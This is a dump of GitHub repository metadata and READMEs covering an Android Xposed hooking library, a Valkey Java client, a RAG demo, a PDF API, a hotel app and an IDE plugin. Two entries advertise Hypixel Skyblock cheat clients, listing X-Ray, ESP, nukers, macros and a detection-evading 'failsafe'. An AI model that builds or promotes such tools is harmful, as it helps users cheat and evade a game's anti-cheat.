// 如果既不继承 BaseHC 使用，也不使用日志增强功能则不需要配置混淆规则。
```

- 到此完成全部工作，可以愉快的使用了！

# 💡 链式调用

- 本工具支持链式调用，使用 chain() 方法创建链式。
- 这是本工具重构提供的全新链式方案，是否更简洁高效了呢？
- 代码示例:

```java
// 链式调用
public class MainTest extends BaseHC {
    public void test() {
        // 看！是不是很简洁易懂？
        chain(""com.hchen.demo"", method(""test"")
                .hook(new IAction() {
                    @Override
                    public void before() {
                        super.before();
                    }
                })

                .anyMethod(""test"")
                .hook(new IAction() {
                    @Override
                    public void after() {
                        super.after();
                    }
                })

                .constructor()
                .returnResult(false)
        );
    }
}
```

# 🔥 泛型转换

- 传统 Xposed MethodHookParam 的各种方法返回都是 Object。 这就使得我们必须显性的进行类型转换才能使用。
- 本工具则充分使用泛型，就不需要显性的进行类型转换啦！

```java
public class MainTest extends BaseHC {
    @Override
    public void init() {
        new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) {
                Context context = (Context) param.thisObject;
                String string = (String) param.args[0];
                param.args[1] = 1;
                String result = (String) XposedHelpers.callMethod(param.thisObject, ""call"",
                        param.thisObject, param.args[0]);
                XposedHelpers.callStaticMethod(XposedHelpers.findClass(""com.demo.Main"", ClassLoader.getSystemClassLoader()),
                        ""callStatic"", param.thisObject, param.args[1]);
                int i = (int) XposedHelpers.getStaticObjectField(XposedHelpers.findClass(""com.demo.Main"", ClassLoader.getSystemClassLoader()),
                        ""field"");
            }
        };

        new IAction() {
            @Override
            public void before() {
                Context context = thisObject(); // 无需显式转换
                String string = first(); // 更符合直觉的参数获取 :)
                second(1); // 更符合直觉的参数设置 :)
                // 非静态本类内
                setThisField(""demo"", 1);
                callThisMethod(""method"",...);
                // 非静态本类外
                setField(obj, ""demo"", 1);
                callMethod(obj, ""method"");

                // 静态需要 class
                callStaticMethod(""com.demo.Main"", ""callStatic"", thisObject(), second());
                int i = getStaticField(""com.demo.Main"", ""field"");
                setStaticField(""com.demo.Main"", ""test"", true);

                removeSelf(); // 你可调用此方法，使得挂钩自己失效
                observeCall();  // 观察调用
                getStackTrace(); // 获取堆栈
            }
        };
    }
}

```

# 📌 全面丰富

- 工具提供了全面丰富的方法供你调用。
- 包括:

----

- ContextTool 类:
- 更方便的获取 context 。

```java
public class MainTest {
    public void test() {
        // 即可最简单的获取 context
        Context context = ContextTool.getContext(ContextUtils.FLAG_ALL);
    }
}
```

----

- InvokeTool 类:
- 更方便稳健的反射类。

```java
public class MainTest {
    public void test() {
        // 即可反射调用方法，其他反射操作同理。
        InvokeTool.callMethod(InvokeTool.findClass(""com.hchen.demo.Main"",
                getClass().getClassLoader()), ""test"", new Class[]{});
    }
}
```

----

- PropTool 类:
- 更方便的 prop 读取修改工具。

```java
public class MainTest {
    public void test() {
        // 只能在系统框架中调用才能设置 prop
        PropTool.setProp(""ro.test.prop"", ""1"");
        // 获取可以随意
        String result = PropTool.getProp(""ro.test.prop"");
    }
}
```

---

- PrefsTool 类:
- 提供 prefs 读取修改功能。

```java
// 寄生应用内
public class MainTest extends BaseHC {
    @Override
    public void init() {
        // xprefs 模式：
        // 注意 xprefs 模式，寄生应用不能修改配置只能读取。
        String s = prefs().getString(""test"", ""1"");  // 即可读取
        s = prefs(""myPrefs"").getString(""test"", ""1"");  // 可指定读取文件名

        // sprefs 模式：
        // 配置会保存到寄生应用的私有目录，读取也会从寄生应用私有目录读取。
        prefs(context).editor().putString(""test"", ""1"").commit();
        // 如果没有继承 BaseHC 可以这样调用。
        PrefsTool.prefs(context).editor().putString(""test"", ""2"").commit();
        // 注意 sprefs 模式 是和 xprefs 模式相互独立的，可共同存在。

        // 如果不方便获取 context 可用使用此方法，异步获取寄生应用上下文后再设置。
        asyncPrefs(new PrefsTool.IAsyncPrefs() {
            @Override
            public void async(Context context) {
                prefs(context).editor().putString(""test"", ""1"").commit();
            }
        });
    }
}

// 模块内
public static class MainActivity {
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        // ！！！如果使用 xprefs 模式，请在模块主界面调用 PrefsTool.prefs(context); 初始化一下，否则可能不可用！！！
        PrefsTool.prefs(this); // 或
        PrefsTool.prefs(this,/* 你自己的 prefs 名称 */);

        // 使用方法
        prefs(this).editor().putString(""test"", ""1"").commit();
        prefs(this, ""myPrefs"").editor().putString(""test"", ""1"").commit();
    }
}
```

---

- CoreTool 类:
- 提供完善的 Hook 方法！
- 绝对满足需求！

----

- DeviceTool 类:
- 方便的获取系统基本信息。
- 具体参见源代码和注释。

----

- ResTool 类:
- 将模块资源注入目标作用域。
- 具体参见源代码与注释。

----

- PackagesTool 类:
- 快速获取软件包信息！

----

- BitmapTool 类:
- Drawable 转 Bitmap。

----

- 其他更多精彩正在加载···

# 💕 工具使用者

- 以下项目使用了本工具！

|      项目名称      |                            项目链接                            |
|:--------------:|:----------------------------------------------------------:|
| ForegroundPin  |  [ForegroundPin](https://github.com/HChenX/ForegroundPin)  |
| AutoSEffSwitch | [AutoSEffSwitch](https://github.com/HChenX/AutoSEffSwitch) |

- 如果你的项目使用了本工具，可以告诉我，我将会把其加入表格。
- 想要详细了解本工具也可以参考上述项目，希望给你带来帮助！

# 📢 项目声明

- **本工具基于：**
- [LSPosed](https://github.com/LSPosed/LSPosed)

- 使用本工具请注明。

# 🎉 结尾

- 感谢您愿意使用本工具！Enjoy your day! ♥️
",Java 版 Hook 工具！,,2024-04-14T08:12:56Z,2024-09-17T04:46:24Z,2024-09-14T13:08:47Z,16,1,10,171,0,2,16,5,0,GPL-3.0,Java
NanCunChild/ldbp,master,,乐到不跑，基于影梭服务的步道乐跑特别版本,,2024-04-11T07:04:44Z,2024-04-17T01:11:14Z,2024-04-11T09:45:46Z,1,1,30,8,0,1,16,8,5,GPL-3.0,Java
PamodRathnayake/Social-media-platform-with-API-Master-of-Spring-Boot,main,# Social-media-platform-with-API-Master-of-Spring-Boot,,,2024-04-09T09:47:14Z,2024-04-09T09:49:20Z,,0,1,0,2,0,0,16,1,0,,Java
MossCG/DGLAB-OI,master,"# 郊狼OI联动
| 更适合ACM宝宝体质的郊狼~ | <br>
| 杂鱼蒟蒻ACMer是要被电的哦~ |

本项目使用 [DGLAB-BT](https://github.com/MossCG/DGLAB-BT) 开发<br>
（也是咱写的23333）<br>
Tips：请在正式使用前一定先调好参数！别把自己电坏了啊杂鱼！

## 支持设备
| 郊狼版本 | 是否支持 |
|------|------|
| 2.0  | 是    |
| 3.0  | 否    |

## 适配OJ
| ID   | 名称         | 作者     | 进度  |
|------|------------|--------|-----|
| CF   | Codeforces | MossCG | 已完成 |
| ZUCC | 浙大城院OJ     | MossCG | 已完成 |

## 进度报告
- 蓝牙部分几乎搓完了/支持2.0主机
- 已开始适配OJ......

## 开发进度
- |√| 基础代码框架
- |√| 蓝牙框架
- |√| 强度计算框架
- |√| 蓝牙连郊狼功能（仅支持2.0主机）
- |√| 爬OI功能（请各位自行适配学校OJ哦~）

## 强度计算规则
- 基础强度：value=basicValue;
- WA增量：value+=WATimes*WAValue;
- AC增量：value+=ACTimes*ACValue;
- 排名增量：value+=(rank-1)*rankValue;
- 强度上限：if (value>limit) v=limit;

PS：控制好强度上限啊喂！别把自己电坏了啊杂鱼！",杂鱼蒟蒻ACMer是要被电的哦~,,2024-04-29T06:20:48Z,2024-06-26T16:29:41Z,2024-05-21T12:42:59Z,2,2,1,12,0,1,16,1,0,GPL-3.0,Java
MoeStick/Polar-client,main,"# 🌟 Polar Feature List

## 🛠️ Current Features

### 🏹 Commission
- No etherwarp required.
- Pidgeonless system.
- Specialized for melee slayer commissions.
- Enhanced mining efficiency.

### 💎 Gemstone
- Blue Cheese swap support.
- Advanced strafing movement.
- Optimized for faster mining.
- Integrated mob killer feature.

### 🧪 Powder Delayed
- Smart chest detection.
- Mob killer capability.
- Drill swapping functionality.

### 🪨 Cobblestone
- Customizable to suit various designs.
- Auto warp back feature for efficiency.

### 🏜️ Sand
- Mining speed up to 60 blocks per second.

### ⚒️ MiningQol
- Eliminates the need for drill reset.
- Sticky mining feature.
- Tick gliding for smoother operation.

### 🍄 Glowing Mushroom
- Nuker for rapid clearing.
- ESP for enhanced perception.
- Route Walker to navigate through waypoints.
- Highly customizable routes for efficiency.

### 📦 Misc Features
- General Nuker.
- Automated Harp playing.
- Ghost blocks handling.
- Hub fishing optimization.
- X-Ray for enhanced visibility.
- Armor swapping for situational needs.
- Slayer: Advanced combat capabilities.
- Ghost: Enhanced stealth and invisibility features.
- Failsafe Bot: Increased safety and reliability.

## 🌐 Upcoming Features

- 🪨 Obsidian: Specialized mining techniques.
- 🌌 Quartz: Efficient quartz mining.
- 🐉 Scatha: Advanced dragon handling.
- 📚 Bestiary: Comprehensive creature cataloging.",Good qol mod that has everything from early till end game,"gemstone-macro,hypixel-skyblock,minecraft,polar,polar-client,taunahi,mining-macro",2024-04-20T19:04:55Z,2024-07-16T12:39:32Z,2024-07-16T12:39:32Z,1,1,0,7,0,13,16,1,0,AGPL-3.0,Java
valkey-io/valkey-java,master,"# Valkey-Java
valkey-java is [Valkey](https://github.com/valkey-io/valkey)'s Java client, derived from [Jedis](https://github.com/redis/jedis) fork, dedicated to maintaining simplicity and high performance.


# Getting started
Add the following dependencies to your `pom.xml` file, you can find the latest version of valkey-java at [Maven Central](https://central.sonatype.com/artifact/io.valkey/valkey-java).
```
<dependency>
    <groupId>io.valkey</groupId>
    <artifactId>valkey-java</artifactId>
    <version>5.3.0</version>
</dependency>
```

## Connect to Valkey

```java
public class ValkeyTest {
    // can be static or singleton, thread safety.
    private static io.valkey.JedisPool jedisPool;

    public static void main(String[] args) {
        io.valkey.JedisPoolConfig config = new io.valkey.JedisPoolConfig();
        // It is recommended that you set maxTotal = maxIdle = 2*minIdle for best performance
        config.setMaxTotal(32);
        config.setMaxIdle(32);
        config.setMinIdle(16);
        jedisPool = new io.valkey.JedisPool(config, < host >, <port >, <timeout >, <password >);
        try (io.valkey.Jedis jedis = jedisPool.getResource()) {
            jedis.set(""key"", ""value"");
            System.out.println(jedis.get(""key""));
        } catch (Exception e) {
            e.printStackTrace();
        }
        jedisPool.close(); // when app exit, close the resource.
    }
}
```

## Connect to the Valkey cluster

```java
import java.util.HashSet;
import java.util.Set;

import io.valkey.HostAndPort;

public class ValkeyClusterTest {
    private static final int DEFAULT_TIMEOUT = 2000;
    private static final int DEFAULT_REDIRECTIONS = 5;
    private static io.valkey.JedisCluster jc; // be static or singleton, thread safety.

    public static void main(String[] args) {
        io.valkey.ConnectionPoolConfig config = new io.valkey.ConnectionPoolConfig();
        // It is recommended that you set maxTotal = maxIdle = 2*minIdle for best performance
        // In cluster mode, please note that each business machine will contain up to maxTotal links,
        // and the total number of connections = maxTotal * number of machines
        config.setMaxTotal(32);
        config.setMaxIdle(32);
        config.setMinIdle(16);

        Set<HostAndPort> jedisClusterNode = new HashSet<HostAndPort>();
        jedisClusterNode.add(new HostAndPort(host, port));
        jc = new io.valkey.JedisCluster(jedisClusterNode, DEFAULT_TIMEOUT, DEFAULT_TIMEOUT, DEFAULT_REDIRECTIONS,
            password, null, config);

        jc.set(""key"", ""value""); // Note that there is no need to call jc.close() here, 
        // the connection recycling is actively completed internally.
        System.out.println(jc.get(""key""));

        jc.close(); // when app exit, close the resource.
    }
}
```

## Connect using TLS method

```java
import java.io.FileInputStream;
import java.io.InputStream;
import java.security.KeyStore;
import java.security.SecureRandom;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.TrustManagerFactory;

import org.apache.commons.pool2.impl.GenericObjectPoolConfig;

public class ValkeySSLTest {
    private static SSLSocketFactory createTrustStoreSSLSocketFactory(String jksFile) throws Exception {
        KeyStore trustStore = KeyStore.getInstance(""jks"");
        InputStream inputStream = null;
        try {
            inputStream = new FileInputStream(jksFile);
            trustStore.load(inputStream, null);
        } finally {
            inputStream.close();
        }

        TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(""PKIX"");
        trustManagerFactory.init(trustStore);
        TrustManager[] trustManagers = trustManagerFactory.getTrustManagers();

        SSLContext sslContext = SSLContext.getInstance(""TLS"");
        sslContext.init(null, trustManagers, new SecureRandom());
        return sslContext.getSocketFactory();
    }

    public static void main(String[] args) throws Exception {
        // When you don't have a jks file, just set sslSocketFactory to null.
        final SSLSocketFactory sslSocketFactory = createTrustStoreSSLSocketFactory( < your_jks_file_path >);
        io.valkey.JedisPool jedisPool = new io.valkey.JedisPool(new GenericObjectPoolConfig(), < host >,
            <port >, <timeout >, <password >, 0, true, sslSocketFactory, null, null);

        try (io.valkey.Jedis jedis = pool.getResource()) {
            jedis.set(""key"", ""value"");
            System.out.println(jedis.get(""key""));
        } catch (Exception e) {
            e.printStackTrace();
        }

        jedisPool.close(); // when app exit, close the resource.
    }
}
```

# Pool Configuration
The following are the common parameters of apache common-pool and their meanings：

| Parameter | Meanings                                                                                                                                                                                                         | Default value | Recommended value              |
| --- |------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---------------|--------------------------------|
|connectionTimeout| Initialize the timeout period for connecting to the cluster, such as the timeout period for reconnecting the cluster at startup and after the TCP connect is disconnected.                                       | 2000          | 5000                           |
|soTimeout| The timeout period for API access. For example, the timeout period for operations such as set and get.                                                                                                           | 2000          | 2000                           |
|maxTotal/maxIdle/minIdle | standalone mode: the connection to redis; cluster mode: The number of connections to a node in the cluster                                                                                                       | 8，8，0         | MaxTotal = MaxIdle = 2*MinIdle |
|blockWhenExhausted| When the resource pool is used up, whether the caller needs to wait or not. If not, an exception with insufficient connection is returned. The following maxWaitMillis takes effect only when the value is true. | true          | true                           |
|maxWaitMillis| The maximum wait time (in milliseconds) of the caller when the resource pool connection is exhausted.                                                                                                            | -1            | depending on your business     |
|testOnBorrow| Whether to check the validity of the connection (send the ping command) when borrowing the connection from the resource pool. The detected invalid connection will be removed.                                   | false         | false                          |
|testOnReturn| Whether to check the validity of the connection (send a ping command) when returning the connection to the resource pool. The detected invalid connection will be removed.                                       | false         | false                          |
|testOnCreate| If you create a new connection when borrowing a connection, we recommend that you disable it if you check whether the connection validity is performed (send a ping command).                                    | false         | false                          |
|testWhileIdle| Whether to check the validity of the connection (send a ping command) when detecting idle connections. If the connection is invalid, it will be closed.                                                          | true          | true                           |
|timeBetweenEvictionRunsMillis| The detection period of idle resources. Unit: milliseconds.                                                                                                                                                      | 30000         | 30000                          |
|minEvictableIdleTimeMillis| The minimum idle time (in milliseconds) of resources in the resource pool. When this value is reached, idle resources are removed. Unit: milliseconds.| 60000         | 60000                          |
|numTestsPerEvictionRun|The number of resources that are detected each time when idle resources are detected.| -1            | -1                             |
|evictionPolicy|Set the evict class, including the elimination algorithm. The default implementation is DefaultEvictionPolicy, which is eliminated according to the idle time.|         DefaultEvictionPolicy      |     DefaultEvictionPolicy                           |
|evictionPolicyClassName|Set the evict class name. The default implementation is DefaultEvictionPolicy, which is eliminated according to the idle time.|      DefaultEvictionPolicy         |         DefaultEvictionPolicy                       |
|evictorShutdownTimeoutMillis|The default waiting time when you exit the evictor.Unit: milliseconds.    |       10000        |                  10000              |
|fairness|When the connection pool is exhausted, multiple threads may block waiting for resources. If the fairness is true, threads can obtain resources in sequence.|        false       |           false                     |
|lifo|When multiple connections are available in the connection pool, a connection is selected based on this value. (Last in, First out)|         true      |        true                        |

# Roadmap
The following is what we plan to complete in the future
1. Support new API for Valkey
2. Support asynchronous
3. Reduce the number of client links in cluster mode
4. Tracing mode can record the access latency of each API.

# Contribution
Contributions are always welcome. If you discover bugs or have new ideas, please open the issue or submit a PR.

# LICENSE
[MIT](LICENSE)",Java client for Valkey.,"client,java,nosql,sdk,valkey",2024-04-28T08:38:14Z,2024-08-08T12:21:49Z,2024-08-08T12:08:37Z,2,210,2,2394,0,1,16,5,2,MIT,Java
Fernanda-Kipper/ai-assistant-java,main,"# AI Assistant APP

![Java](https://img.shields.io/badge/java-%23ED8B00.svg?style=for-the-badge&logo=openjdk&logoColor=white)
![Spring](https://img.shields.io/badge/spring-%236DB33F.svg?style=for-the-badge&logo=spring&logoColor=white)
[![Licence](https://img.shields.io/github/license/Ileriayo/markdown-badges?style=for-the-badge)](./LICENSE)

This project is an API built using **Java, Java Spring, Langchain4j and LM Studio.**

The app was developed for my [Youtube Tutorial](https://www.youtube.com/live/Vo7OnKULYUg?si=xkKK2eVBFQNJSih4), to demonstrate how to create a simple AI Assistant using RAG technique.

## Table of Contents

- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
- [API Endpoints](#api-endpoints)
- [Contributing](#contributing)

## Installation

1. Clone the repository:

```bash
git clone https://github.com/Fernanda-Kipper/ai-assistant-java
```

2. Install dependencies with Maven

## Usage

1. Start the application with Maven
2. The API will be accessible at http://localhost:8080
3. Install [LM Studio](https://lmstudio.ai/)
4. Download model Google's Gemma 2B Instruct
5. Start LM Server

<img src="".github/lm-studio-print.png""/>

## API Endpoints
The API provides the following endpoints:

**GET USERS**
```markdown
POST /api/chat - Retrieve a list of all users.
```
```json
{
  ""message"": ""List 4 movies of the catalog that have Category Romance""
}
```
```json
{
  ""response"": ""The movies that have Category Romance are: - La La Land - Titanic""
}
```

## RAG Knowledge Base
The Knowledge base used for retrieve context to RAG technique is the movies.txt located inside `src/main/resources` path

```txt
Movie Catalog
---

Movie: The Godfather
Year: 1972
Director: Francis Ford Coppola
Actors: Marlon Brando, Al Pacino, James Caan
Category: Action
Synopsis: The saga of the Corleone family in the Italian mafia of New York.
---

Movie: Fight Club
Year: 1999
Director: David Fincher
Actors: Brad Pitt, Edward Norton, Helena Bonham Carter
Category: Action
Synopsis: A disillusioned white-collar worker forms an underground fight club.
---

Movie: Forrest Gump
Year: 1994
Director: Robert Zemeckis
Actors: Tom Hanks, Robin Wright, Gary Sinise
Category: Comedy
Synopsis: The story of a man with low IQ who witnessed or influenced significant events of the 20th century in America, maintaining hope and love for his childhood passion, Jenny.
---

Movie: Titanic
Year: 1997
Director: James Cameron
Actors: Leonardo DiCaprio, Kate Winslet, Billy Zane
Category: Romance
Synopsis: A poor artist and a rich young woman meet and fall in love on the fateful voyage of the RMS Titanic.
---

Movie: La La Land
Year: 2016
Director: Damien Chazelle
Actors: Ryan Gosling, Emma Stone, John Legend
Category: Romance
Synopsis: A jazz musician and an aspiring actress fall in love while pursuing their dreams in a city known for crushing hopes and breaking hearts.
---

```

## Contributing

Contributions are welcome! If you find any issues or have suggestions for improvements, please open an issue or submit a pull request to the repository.

When contributing to this project, please follow the existing code style, [commit conventions](https://www.conventionalcommits.org/en/v1.0.0/), and submit your changes in a separate branch.




",AI Assistant using RAG technique to give contextualized responses,"ai-assistant,java,langchain4j,rag",2024-04-14T22:18:47Z,2024-04-15T17:58:29Z,,0,1,0,3,0,1,16,1,0,,Java
ComPDFKit/compdfkit-api-samples,main,"## ComPDFKit PDF API

[ComPDFKit PDF API](https://api.compdf.com/) is organized around the REST standard and provides you with a simple document-upload, document-process, document-download workflow. Supporting various programming languages (such as [Java](https://api.compdf.com/api-libraries/in-java), [Python](https://api.compdf.com/api-libraries/in-python), [C#](https://api.compdf.com/api-libraries/in-net), [PHP](https://api.compdf.com/api-libraries/in-php), [Swift](https://api.compdf.com/api-libraries/in-swift), JavaScript, etc.), ComPDFKit API offers rich PDF functionalities, including conversion, document editor, data extraction, and so forth. 

Before integrating the below PDF capabilities, you can register a free [ComPDFKit API](https://api.compdf.com/signup) account to process 1,000 files per month without costs and limitations. 

| [PDF to Word](https://api.compdf.com/api-reference/pdf-to-word) | [PDF to Excel](https://api.compdf.com/api-reference/pdf-to-excel) | **[PDF to PPT](https://api.compdf.com/api-reference/pdf-to-ppt)** | [PDF to HTML](https://api.compdf.com/api-reference/pdf-to-html) |
| :----------------------------------------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| [PDF to RTF](https://api.compdf.com/api-reference/pdf-to-rtf) | [PDF To Image](https://api.compdf.com/api-reference/pdf-to-image) | [PDF to CSV](https://api.compdf.com/api-reference/pdf-to-csv) | [PDF to TXT](https://api.compdf.com/api-reference/pdf-to-txt) |
| [Data Extraction](https://api.compdf.com/api-reference/pdf-to-json) | [PDF to Editable PDF](https://api.compdf.com/api-reference/pdf-to-editable-pdf-tool-guide) | [Image to Word](https://api.compdf.com/api-reference/image-to-word) | [Image to Excel](https://api.compdf.com/api-reference/image-to-excel) |
| [Image to PPT](https://api.compdf.com/api-reference/image-to-ppt) | [Image to HTML](https://api.compdf.com/api-reference/image-to-html) | [Image to RTF](https://api.compdf.com/api-reference/image-to-rtf) | [Image to CSV](https://api.compdf.com/api-reference/image-to-csv) |
| [Image to TXT](https://api.compdf.com/api-reference/image-to-txt) | [Word to PDF](https://api.compdf.com/api-reference/word-to-pdf) | [Excel to PDF](https://api.compdf.com/api-reference/excel-to-pdf) | [PPT to PDF](https://api.compdf.com/api-reference/ppt-to-pdf) |
| [HTML to PDF](https://api.compdf.com/api-reference/html-to-pdf) | [RTF to PDF](https://api.compdf.com/api-reference/rtf-to-pdf) | [PNG to PDF](https://api.compdf.com/api-reference/image-to-pdf) | [CSV to PDF](https://api.compdf.com/api-reference/csv-to-pdf) |
| [TXT to PDF](https://api.compdf.com/api-reference/txt-to-pdf) | [Merge PDF](https://api.compdf.com/api-reference/merge)      | [Split PDF](https://api.compdf.com/api-reference/split)      | [Rotate PDF](https://api.compdf.com/api-reference/rotate)    |
| [Delete PDF](https://api.compdf.com/api-reference/delete)    | [Insert PDF](https://api.compdf.com/api-reference/insert)    | [Extract PDF](https://api.compdf.com/api-reference/extract)  | [Compare PDF](https://api.compdf.com/api-reference/compare-documents) |
| [OCR](https://api.compdf.com/api-reference/ocr)              | [Layout Analysis](https://api.compdf.com/api-reference/layout-analysis) | [Image Sharpening Enhancement](https://api.compdf.com/api-reference/image-processing) | [Form Recognizer](https://api.compdf.com/api-reference/form-recognizer) |
| [Trim Correction](https://api.compdf.com/api-reference/trim-correction) | [Stamp Inspection](https://api.compdf.com/api-reference/stamp-inspection) | [Add Watermark](https://api.compdf.com/api-reference/watermark-guides) | [Compression PDF](https://api.compdf.com/api-reference/compress-guides) |



## Getting Started with Code Samples

This GitHub repository provides public access to code examples that demonstrate how to programmatically submit requests to the [ComPDFKit API](https://api.compdf.com/) service.

Before you begin, you may need to do some preparatory work.

- [Register](https://api.compdf.com/signup) a free ComPDFKit API account using email only.
- Obtain the project ID and its related key from the [API Keys](https://api-dashboard.compdf.com/api/keys) section of the console.
- To start requesting the ComPDFKit API, please read the comprehensive [API reference](https://api.compdf.com/api-reference/overview) for the function you need to call.



## Instructions for Running Code Demo

### Authentication

You can get **accessToken** and related verification information by sending your **publicKey** and  **SecretKey** . AccessToken will expire after **12** hours. **When calling the subsequent interface, you must carry this token in the request header**: `Authorization: Bearer {accessToken}`.

Before running each sample program, look for a comment that reads:

> `public_key_******`
>
> ` secret_key_******`

and replace `******` with your API Keys.

### Create task

A task ID is automatically generated for you based on the type of PDF tool you choose. You can provide the callback notification URL. After the task processing is completed, we will notify you of the task result through the callback interface. You can perform other operations according to the task result, such as downloading the result file.

### Upload files

Upload the original file and bind the file to the task ID. The field **parameter** is used to pass the JSON string to set the processing parameters for the file. Each file will generate automatically a unique **filekey**. 

Please note that a maximum of five files can be uploaded for a task ID and no files can be uploaded for that task after it has started.

### Execute task and get task information

After the file is uploaded, the file processing starts and the download link of the corresponding result file is obtained according to the **filekey** of each file



## API Documentation

After you've successfully sent an API Call using these examples, take a look at the [Documentation](https://api.compdf.com/api-reference/overview) for each API endpoint for a full description of parameters you can adjust to customize your solution.



## Support

ComPDFKit has a professional R&D team that produces comprehensive technical documentation and guides to help developers. Also, you can get an immediate response when reporting your problems to our support team.

- For detailed information, please visit our [API Reference](https://api.compdf.com/api-reference/overview) page.
- Stay updated with the latest improvements through our [Changelog](https://www.compdf.com/api/changelog-compdfkit-api).
- For technical assistance, please reach out to our [Technical Support](https://www.compdf.com/support).
- To get more details and an accurate quote, please contact our [Sales Team](https://api.compdf.com/contact-us).



## Related

- Convert PDF to/ from other formats using [PDF online tools](https://www.compdf.com/pdf-tools)
- [Convert PDF to Image (JPG, PNG) with ComPDFKit API and Java](https://www.compdf.com/blog/convert-pdf-to-image-in-java-compdfkit-api)
- [Convert Excel to PDF Using Java - Free PDF Converter API](https://www.compdf.com/blog/convert-excel-to-pdf-using-java-api)
- Experience [ComPDFKit Web Demo](https://www.compdf.com/webviewer/demo) on any browser","ComPDFKit PDF API is organized around the REST standard and supports various programming languages with rich PDF features, including conversion, document editor, data extraction, and so forth. ","api,curl,dotnet,java,javascript,pdf-converter,pdf-editor,pdf-viewer,php,python",2024-04-29T08:27:01Z,2024-04-30T07:42:47Z,,0,2,0,13,0,2,16,1,0,Apache-2.0,Java
deerborg/Tourism-Agency-Management,main,"## Tourism Agency Project

<img src = ""assets/banner.png"" />

This project is a hotel management system developed to digitize the daily operations of Patika Tourism Agency and optimize customer reservation processes.



## Opening the Project

1. Open the main folder where the `src` directory is located to start the project.

2. You cannot start the project without opening the main folder because the file path will not be found.

3. It is necessary to open the folder where the project is located completely.

4. **Important Note:** If you open the entire folder, you need to correct the path `""src/Log/DBconfigure.properties""` in the `Database.java` file. The correct path should be `Tourism-Agency-Management/Tourism-Agency-Management/src/Log/DBconfigure.properties`.

## Requirements

- Java 22 or higher version.
- [PostgreSQL JDBC driver](https://jdbc.postgresql.org/download.html) (e.g., postgresql-42.7.3.jar)

## Adding the Library

1. Add the downloaded PostgreSQL JDBC driver (e.g., `postgresql-42.7.3.jar`) file to your project's directory structure.

2. After opening your project, add this library to your project in your IDE or the tool you use for compilation. This step ensures that the JDBC driver can be used when compiling the project.


##
---
    Requires Java 22.0.0 to be controlled

## Features

- There are two types of users: admin and agency staff.
- User management: Admin can add, delete, update users and assign roles.
- Hotel management: Agency staff can add and edit hotels.
- Room management: Agency staff can add and price rooms.
- Period management: Agency staff can add periods for hotels.
- Price management: Agency staff can set room prices.
- Room search: Agency staff can search for rooms based on desired criteria and make reservations.
- Reservation management: Agency staff can list, add, update, and delete reservations.

## Technical Details

- The project is designed according to SOLID principles and MVC architecture.
- PostgreSQL is used as the database.
- SwingGUI is used for the user interface.
- The project follows a multi-layered architecture.

## Installation

1. Clone the project:
    ```bash
    git clone https://github.com/deerborg/Tourism-Agency-Management.git
    ```
2. Install PostgreSQL and update the connection details.
3. Open the project in your IDE.
4. Configure the database connection in `src/main/resources/src/Log/DBconfigure.properties`.
5. Compile and run the project.

## Video
[![Watch the video](https://img.youtube.com/vi/64gIdw2fkA0/0.jpg)](https://www.youtube.com/watch?v=64gIdw2fkA0)

## Screenshots

- User Login Screen

<img src = ""assets/1.png"" />

- Admin Panel

<img src = ""assets/3.png"" />


- Agency Staff Panel

<img src = ""assets/2.png"" />

- Hotel Adding Screen

<img src = ""assets/2.png"" />

- Room Adding Screen

<img src = ""assets/8.png"" />

- Reservation Screen

<img src = ""assets/14.png"" />


## Usage

1. Admin logs in and creates the first user.
2. Admin adds agency staff and authorizes them.
3. Agency staff adds hotels and rooms to the system.
4. Agency staff adds periods and sets prices.
5. Agency staff searches for rooms based on customer requests and makes reservations.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
",☕ The main purpose of this project is to enable businesses operating in the hotel sector to manage their daily operations more effectively and optimize customer reservation processes.,"tourimse,postgresql,solid,swing-gui,tourism-management",2024-04-22T11:49:50Z,2024-05-08T23:25:46Z,,0,2,0,13,0,0,16,1,0,MIT,Java
Rixafy/LatteSupport,master,"Latte Support for PhpStorm
=========================================

<!-- Plugin description -->
Fork of the [original free plugin](https://github.com/nette-intellij/intellij-latte), provides decent support for [Latte](https://latte.nette.org) templates.

<!-- Plugin description end -->

![example](https://i.imgur.com/KjIAx90.gif)


Notice
------------
This plugin is in maintenance mode only (but feel free to contribute new features), errors and performance issues will still be fixed and updates will be on time, if you are looking for a plugin with more features, check out paid [Latte Pro](https://plugins.jetbrains.com/plugin/19661-latte-pro) plugin. This fork has been created as another free plugin, since code completion feature was removed from the original free plugin.

If you have any problems with the plugin, [create an issue](https://github.com/Rixafy/LatteSupport/issues/new/choose) or use #latte channel at the [Nette Discord](https://discord.gg/azXxTbuQVq).


Installation
------------
Settings → Plugins → Browse repositories → Find ""Latte Support"" → Install Plugin → Apply


Installation from .jar file
------------
Download `instrumented.jar` file from [latest release](https://github.com/Rixafy/LatteSupport/releases) or latest successful [GitHub Actions build](https://github.com/Rixafy/LatteSupport/actions)


Supported Features
------------------

* Syntax highlighting and code completion for `PHP` in `Latte` files
* Type support and reference to classes and methods in `Latte` files (see [{templateType}](https://latte.nette.org/type-system#toc-templatetype))
* Refactoring support for `Latte` files (when changing class name, method name, etc.)
* Live analysis of `Latte` files (unused variables, syntax errors, etc.)


Building
------------

```$xslt
$ ./gradlew build -x test
```

Testing in dummy IDE
------------

```$xslt
$ ./gradlew runide
```
",☕ Latte for PhpStorm and IntelliJ IDEA,"intellij,intellij-idea,intellij-plugin,latte,nette,nette-framework,phpstorm,phpstorm-plugin",2024-04-21T02:10:06Z,2024-06-23T17:43:02Z,2024-05-22T15:33:49Z,11,6,1,217,2,1,16,1,1,MIT,Java
MoeStick/Taunahi-V3,main,"# TaunahiTaunahi - Next Generation Skyblock Scripts

**Stop overpaying for bad scripts - get Taunahi.**
## GUI Showcase
![](https://cdn.discordapp.com/attachments/980212612153368607/1201110819115630652/ezgif-1-9fb60872ea.gif?ex=65c8a09e&is=65b62b9e&hm=f6906b2099dd30c8f31aa96b5b916ebd32c5fe4b3dee88135de46bc90d68f30a&)
## 🌾 Farming
All the fully automatic scripts that will level up your farming skill and earn you coins. Supports a high amount of both basic and advanced farm designs.

